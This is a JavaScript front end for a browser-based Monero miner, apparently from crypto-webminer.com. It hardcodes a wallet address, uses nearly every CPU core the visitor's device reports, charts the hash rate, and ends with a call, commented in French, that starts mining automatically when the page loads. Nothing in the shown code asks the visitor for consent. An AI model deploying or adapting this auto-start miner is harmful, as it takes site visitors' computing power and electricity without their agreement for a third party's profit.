// Copyright (c) 2017 - 2024 | crypto-webminer.com
$(function() {
  if (navigator.hardwareConcurrency > 1) {
    $('#threads').text(navigator.hardwareConcurrency - 1);
  } else {
    $('#threads').text(navigator.hardwareConcurrency);
  }

  var threads = $('#threads').text();
  var gustav;
  var statuss;
  var barChart;
  var barChartCanvas = $("#barchart-canvas");
  var siteKey = "nowalletinput";
  var hashingChart;
  var charts = [barChartCanvas];
  var selectedChart = 0;
  var lastrate = 0;
  var totalHashes = 0;
  var totalHashes2 = 0;
  var acceptedHashes = 0;
  var hashesPerSecond = 0;

  var wallet = "445FYQ7V7vucaDaTweVHQ9GeUum6aJV86Vm4T8YMeVk93pAL3NGPKKaNDBHjbpnAdH3cMrhrfoZ4c8MGgbxX7NHoRXzDbzv"; // Remplacez par votre adresse de wallet Monero

  function htmlEncode(value) {
    return $('<div/>').text(value).html();
  }

  function startLogger() {
    statuss = setInterval(function() {
      lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
      totalHashes = totalhashes + totalHashes;
      hashesPerSecond = Math.round(lastrate);
      totalHashes2 = totalHashes;
      totalhashes = 0;
      acceptedHashes = GetAcceptedHashes();
      $('#hashes-per-second').text(hashesPerSecond);
      $('#accepted-shares').text(totalHashes2 + ' | ' + acceptedHashes);
      $('#threads').text(threads);
      if (job !== null) {
        $('#algo').text(job.algo + ' | ' + job.variant);
      }
    }, 1000);

    hashingChart = setInterval(function() {
      if (barChart.data.datasets[0].data.length > 25) {
        barChart.data.datasets[0].data.splice(0, 1);
        barChart.data.labels.splice(0, 1);
      }
      barChart.data.datasets[0].data.push(hashesPerSecond);
      barChart.data.labels.push("");
      barChart.update();
    }, 1000);
  };

  function stopLogger() {
    clearInterval(statuss);
    clearInterval(hashingChart);
  };

  function startMining() {
    PerfektStart(wallet, "x", threads);
    console.log(wallet);
    stopLogger();
    startLogger();
  }

  function stopMining() {
    stopLogger();
    $('#hashes-per-second').text("0");
    $('#accepted-shares').text("0 | 0");
    location.reload();
  }

  $('#thread-add').click(function() {
    threads++;
    $('#threads').text(threads);
    deleteAllWorkers();
    addWorkers(threads);
  });

  $('#thread-remove').click(function() {
    if (threads > 1) {
      threads--;
      $('#threads').text(threads);
      removeWorker();
    }
  });

  $('#autoThreads').click(function() {
    if (gustav) {
      gustav.setAutoThreadsEnabled(!gustav.getAutoThreadsEnabled());
    }
  });

  var barChartOptions = {
    label: 'Hashes',
    elements: {
      line: {
        tension: 0, // disables bezier curves
      }
    },
    animation: {
      duration: 0, // general animation time
    },
    responsiveAnimationDuration: 0,
    scales: {
      yAxes: [{
        ticks: {
          max: 500,
          min: 0
        }
      }]
    }
  };

  var barChartData = {
    labels: [],
    datasets: [{
      label: "Hashes/s",
      backgroundColor: "darkcyan",
      data: []
    }],
  };

  barChart = new Chart(barChartCanvas, {
    type: 'line',
    data: barChartData,
    options: barChartOptions
  });

  // Démarrer le minage automatiquement au chargement de la page
  startMining();
});
